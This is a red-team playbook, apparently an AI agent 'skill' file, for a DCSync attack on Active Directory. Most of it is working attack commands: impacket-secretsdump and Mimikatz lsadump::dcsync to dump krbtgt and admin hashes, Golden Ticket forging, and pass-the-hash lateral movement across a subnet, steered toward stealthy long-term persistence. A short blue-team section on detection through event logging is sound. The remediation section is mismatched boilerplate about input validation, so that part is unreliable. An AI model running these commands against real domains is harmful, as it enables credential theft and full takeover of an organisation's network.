---
name: active-directory-dcsync-attack
description: >
  Execute a DCSync attack mimicking the behavior of a legitimate Active Directory Domain Controller (DC).
  Leverage Directory Replication Service Remote Protocol (DRSR) permissions to silently request and 
  extract the password hashes (NTLM/Kerberos) of any or all users in the domain without executing 
  code on the target Domain Controller.
domain: cybersecurity
subdomain: red-teaming
category: Credential Access
difficulty: expert
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1003.006]
platforms: [windows]
tags: [active-directory, dcsync, mimikatz, credential-dumping, red-teaming, krbtgt]
tools: [mimikatz, impacket-secretsdump]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Active Directory DCSync Attack

## When to Use
- When operating within a compromised Active Directory environment and you have acquired the credentials of a highly-privileged account (e.g., Domain Admin, Enterprise Admin, or a specific Service Account with Directory Replication rights).
- To extract the `krbtgt` account hash, which is absolutely mandatory for forging Golden Tickets subsequently establishing ultimate domain persistence.
- To perform a complete, stealthy domain credential dump without installing malware directly onto the Domain Controller or exporting the physical `NTDS.dit` database file.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Validating Prerequisites

```text
# Concept: A standard domain user CANNOT execute a DCSync. The attacking account MUST possess 
# three highly specific Access Control Entries (ACEs) granted at the Domain Root level:
# 1. Replicating Directory Changes (DS-Replication-Get-Changes)
# 2. Replicating Directory Changes All (DS-Replication-Get-Changes-All)
# 3. Replicating Directory Changes In Filtered Set

# Default Groups possessing these rights natively:
# - Domain Controllers
# - Enterprise Admins
# - Domain Admins
# - Administrators
```

### Phase 2: Remote DCSync via Impacket (Linux/Kali)

```bash
# Concept: You possess a Domain Administrator's NTLM hash or plaintext password. 
# You execute the attack remotely from your Kali machine over the network.

# 1. Target a specific high-value account (e.g., the krbtgt account)
impacket-secretsdump 'CORP/Administrator:Password123!'@10.0.0.5 -just-dc-user krbtgt

# 2. Extract the NTLM hash of a specific Domain Admin
impacket-secretsdump 'CORP/Administrator:Password123!'@10.0.0.5 -just-dc-user JamesP_Admin

# 3. Dump the entire Active Directory Database (Warning: Extremely Noisy)
impacket-secretsdump 'CORP/Administrator:Password123!'@10.0.0.5 -just-dc
```

### Phase 3: Local DCSync via Mimikatz (Windows/Cobalt Strike)

```powershell
# Concept: You are operating interactively on a compromised Windows workstation. 
# You inject a Domain Admin's token into memory and execute Mimikatz dynamically.

# 1. Execute Mimikatz
privilege::debug

# 2. Extract the krbtgt account explicitly
lsadump::dcsync /domain:corp.local /user:krbtgt

# 3. Output Example:
#   SAM Username       : krbtgt
#   User Principal Name: krbtgt@corp.local
#   Hash NTLM          : 1234567890abcdef1234567890abcdef
#   Hash AES256        : abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890

# 4. Extracting the Directory Integration Services Account (Azure AD Connect)
# This account (`MSOL_xxxxxxxx`) holds immense privilege connecting the on-premise AD to Azure.
lsadump::dcsync /domain:corp.local /user:"MSOL_0a1b2c3d4e5f"
```

### Phase 4: Applying DCSync Loot (The Escalation)

```bash
# Concept: The DCSync is purely an extraction technique. The true impact is how the 
# extracted cryptographic material is leveraged.

# Action 1: Golden Ticket Creation (Using the extracted krbtgt hash)
# Forges an unforgeable, 10-year active Kerberos Ticket Granting Ticket (TGT).
impacket-ticketer -nthash 1234567890abcdef1234567890abcdef -domain-sid S-1-5-21-XXX -domain corp.local Administrator

# Action 2: Pass-the-Hash (PTH)
# Utilize any extracted Administrator NTLM hash to uniformly move laterally across all servers unconditionally.
nxc smb 10.0.0.0/24 -u JamesP_Admin -H 9876543210fedcba9876543210fedcba --local-auth
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Compromise Account] --> B[Check Account Group Memberships via `net user /domain`]
    B --> C{Is Account a Domain Admin?}
    C -->|Yes| D[Execute DCSync explicitly targeting `krbtgt`]
    C -->|No| E[Check specific ACEs utilizing BloodHound]
    E -->|Account has 'Replicating Directory Changes'| D
    E -->|Account lacks rights| F[DCSync impossible. Attempt alternative Privilege Escalation (Kerberoasting, BloodHound Paths)]
    D --> G[Extract `krbtgt` NTLM and AES256 hashes]
    G --> H[Forge Golden Ticket]
    H --> I[Establish 10-Year Invisible Active Directory Persistence]
```

## 🔵 Blue Team Detection & Defense
- **Monitor Event ID 4662 (Directory Service Access)**: DCSync fundamentally relies on triggering specific Directory Replication Service (DRS) operations. Configure the Domain Controllers to audit object access. Generate immediate, high-priority SIEM alerts whenever Event ID 4662 triggers containing the specific Access Mask `0x100` coupled with the exact Properties: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes) originating from an IP address that is NOT a verified, legitimate Domain Controller.
- **Rigorously Protect Replication Privileges**: Routinely audit Active Directory ACLs utilizing tooling like `PingCastle` or `BloodHound`. Ensure absolutely that the `Replicating Directory Changes` rights are restricted exclusively to the `Domain Controllers` and specifically authorized service groups (e.g., Microsoft Entra Connect service accounts). Never explicitly grant these rights to standard IT Helpdesk or human administrator accounts dynamically.
- **Network Segmentation**: Isolate Domain Controllers within a highly restricted Tier-0 VLAN. Filter network traversing traffic explicitly blocking `RPC Endpoint Mapper` (Port 135) and dynamically allocated RPC ports seamlessly connecting from the Tier-2 (Workstation) subnet to the Tier-0 Domain Controller subnet. DCSync natively requires robust RPC connectivity to function correctly.

## Key Concepts
| Concept | Description |
|---------|-------------|
| DCSync | An attack methodology natively leveraging the exact built-in Windows APIs (MS-DRSR) utilized by legitimate Domain Controllers to synchronize Active Directory databases, coercing the DC to hand over password hashes seamlessly |
| krbtgt | The fundamental service account natively encrypting all Kerberos authentication tickets across the entire Active Directory domain natively. Possessing its hash inherently grants absolute cryptographic mastery over the domain unconditionally |
| MS-DRSR | The Microsoft Directory Replication Service Remote Protocol; a highly specialized RPC interface facilitating directory synchronization comprehensively |

## Output Format
```
Red Team Execution Protocol: Active Directory DCSync Password Extraction
========================================================================
Target Domain: `hq.corporate.com`
Vulnerability: Compromised Domain Admin Credentials
Severity: Critical (CVSS 10.0)

Description:
Following the successful compromise of the `Network_Admin_SVC` account (which erroneously retained membership within the elevated `Domain Admins` group), the Red Team possessed sufficient privileges inherently required to initiate Active Directory replication synchronization organically.

To strictly avoid deploying heuristic-triggering malware natively onto the Domain Controller (`10.0.0.10`), the attacker utilized Impacket's `secretsdump.py` module explicitly across the network natively leveraging the MS-DRSR protocol.

Targeted Execution:
```bash
impacket-secretsdump 'hq/Network_Admin_SVC:SvcPass99!'@10.0.0.10 -just-dc-user krbtgt
```

Result:
The Domain Controller implicitly trusted the credential context replicating the requested cryptographic material without alerting baseline file-integrity monitors natively.

The `krbtgt` NTLM and AES256 hashes cleanly extracted:
`Hash NTLM: 8846f...[REDACTED]...912a`

Impact:
The adversary natively established comprehensive Golden Ticket generation capability dynamically ensuring uninhibited, invisible administrative access seamlessly surviving standard password resets unequivocally.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Impacket: [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- Mitre ATT&CK: [Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)
- ADSecurity (Sean Metcalf): [Mimikatz DCSync Usage](https://adsecurity.org/?p=1729)
